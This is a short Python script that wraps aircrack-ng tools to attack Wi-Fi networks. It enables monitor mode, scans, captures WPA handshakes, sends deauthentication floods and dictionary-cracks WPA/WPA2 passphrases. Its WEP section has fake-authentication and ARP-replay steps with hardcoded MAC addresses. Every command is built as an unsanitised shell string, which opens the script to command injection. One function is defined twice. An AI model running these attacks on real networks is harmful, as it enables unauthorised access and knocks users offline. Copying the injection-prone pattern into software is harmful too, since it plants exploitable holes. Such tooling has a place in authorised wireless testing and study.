import subprocess  # Module used to execute system commands

def monitor(wifi_cards):
    
    #Enable monitoring mode on the Wi-Fi card.
    subprocess.run(f"sudo airmon-ng start {wifi_cards}", shell=True)

def scan(wifi_cards):
    
    #Scan nearby networks.
    subprocess.run(f"sudo airodump-ng {wifi_cards}", shell=True)


# ------------------------------------------
# WPA/WPA2 protocol
# ------------------------------------------

def handshake(channel, BSSID, interface):
    
    #Capture WPA handshake packets.
    subprocess.run(f"sudo airodump-ng -c {channel} --bssid {BSSID} -w psk {interface}", shell=True)

def deathauth(numberDeauths, accessPoint, client, wirelessCard):
    
    #Send deauthentication packets.
    subprocess.run(f"sudo aireplay-ng -0 {numberDeauths} -a {accessPoint} -c {client} {wirelessCard}", shell=True)

def crack(dictionary, BSSID):
    
    #Crack WPA/WPA2 passphrase.
    subprocess.run(f"sudo aircrack-ng -w {dictionary} -b {BSSID} psk*.cap", shell=True)

# ------------------------------------------
# WEP protocol
# ------------------------------------------

def testing(essid, target_ap, interface ):

    subprocess.run(f"sudo aireplay-ng -9 -e {essid} -a {target_ap}  {interface}", shell=True)


def handshake(channel, BSSID, interface):
    subprocess.run(f"sudo airodump-ng -c {channel} --bssid {BSSID} -w output {interface}", shell=True)

def fake_authetication():
    subprocess.run(f"sudo aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0", shell=True)

def replay_mode():
    subprocess.run(f" aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0", shell=True)





# ------------------------------------------
# WPS protocole
# ------------------------------------------
